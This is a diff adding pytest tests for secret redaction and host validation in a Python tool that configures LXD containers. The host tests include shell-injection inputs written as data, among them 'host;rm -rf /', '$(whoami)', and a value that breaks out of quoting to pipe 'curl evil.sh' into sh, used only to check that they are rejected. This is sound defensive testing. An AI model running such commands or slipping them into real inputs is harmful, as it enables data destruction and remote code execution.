@@ -7,6 +7,7 @@ from unittest.mock import MagicMock
 
 import pytest
 
+from llm import lxd
 from llm.config import _get_lxd_bridge_info
 
 # ── _get_lxd_bridge_info (shared impl used by lxd.py and config.py) ──────────
@@ -853,3 +854,87 @@ class TestNestedVmSupport:
 
         captured = capsys.readouterr()
         assert "sudo systemctl restart snap.lxd.daemon" in captured.out
+
+
+# ── secret redaction ─────────────────────────────────────────────────────────
+
+
+class TestRedaction:
+    """Credentials must never reach the terminal, even if they reach argv."""
+
+    @pytest.fixture(autouse=True)
+    def _isolate_registry(self, monkeypatch):
+        """Keep registered secrets from leaking between tests."""
+        monkeypatch.setattr(lxd, "_SECRET_VALUES", set())
+
+    def test_registered_secret_is_redacted(self):
+        lxd.register_secrets("ghp_supersecretvalue")
+        assert lxd.redact("token=ghp_supersecretvalue") == "token=***"
+
+    def test_short_values_are_not_registered(self):
+        """Short strings would collide with ordinary command text."""
+        lxd.register_secrets("abc")
+        assert lxd.redact("abc def") == "abc def"
+
+    def test_empty_and_none_are_ignored(self):
+        lxd.register_secrets("", None)
+        assert set() == lxd._SECRET_VALUES
+
+    def test_run_does_not_echo_registered_secrets(self, monkeypatch, capsys):
+        lxd.register_secrets("sk-or-v1-secretkey")
+        monkeypatch.setattr(lxd.subprocess, "run", MagicMock())
+
+        lxd.run(["hermes", "config", "set", "model.api_key", "sk-or-v1-secretkey"])
+
+        captured = capsys.readouterr()
+        assert "sk-or-v1-secretkey" not in captured.out
+        assert "***" in captured.out
+
+    def test_run_redacts_failure_output(self, monkeypatch, capsys):
+        lxd.register_secrets("sk-or-v1-secretkey")
+        error = subprocess.CalledProcessError(1, ["cmd"], output="used sk-or-v1-secretkey")
+        error.stderr = "also sk-or-v1-secretkey"
+        monkeypatch.setattr(lxd.subprocess, "run", MagicMock(side_effect=error))
+
+        with pytest.raises(subprocess.CalledProcessError):
+            lxd.run(["cmd"])
+
+        assert "sk-or-v1-secretkey" not in capsys.readouterr().out
+
+
+# ── host validation ──────────────────────────────────────────────────────────
+
+
+class TestValidateHost:
+    """`server_ip` is interpolated into a shell command, so it must be checked."""
+
+    @pytest.mark.parametrize("value", ["192.168.1.50", "10.0.0.5", "::1", "local-llm", "a.b-c.example"])
+    def test_accepts_valid_hosts(self, value):
+        assert lxd.validate_host(value) == value
+
+    @pytest.mark.parametrize(
+        "value",
+        ["", "1.2.3.4 evil", "host;rm -rf /", "$(whoami)", "host'name", "host\nname"],
+    )
+    def test_rejects_shell_unsafe_hosts(self, value):
+        with pytest.raises(ValueError, match="not a valid IP address or hostname"):
+            lxd.validate_host(value)
+
+    def test_add_hosts_entry_is_idempotent_and_validated(self, monkeypatch):
+        calls = MagicMock()
+        monkeypatch.setattr(lxd.subprocess, "run", calls)
+
+        lxd.add_hosts_entry("dev", "192.168.1.50", "local-llm")
+
+        script = calls.call_args.args[0][-1]
+        assert "grep -qxF '192.168.1.50 local-llm' /etc/hosts" in script
+        assert ">> /etc/hosts" in script
+
+    def test_add_hosts_entry_rejects_injection(self, monkeypatch):
+        calls = MagicMock()
+        monkeypatch.setattr(lxd.subprocess, "run", calls)
+
+        with pytest.raises(ValueError, match="not a valid IP address or hostname"):
+            lxd.add_hosts_entry("dev", "1.2.3.4' /etc/hosts; curl evil.sh|sh #", "local-llm")
+
+        calls.assert_not_called()
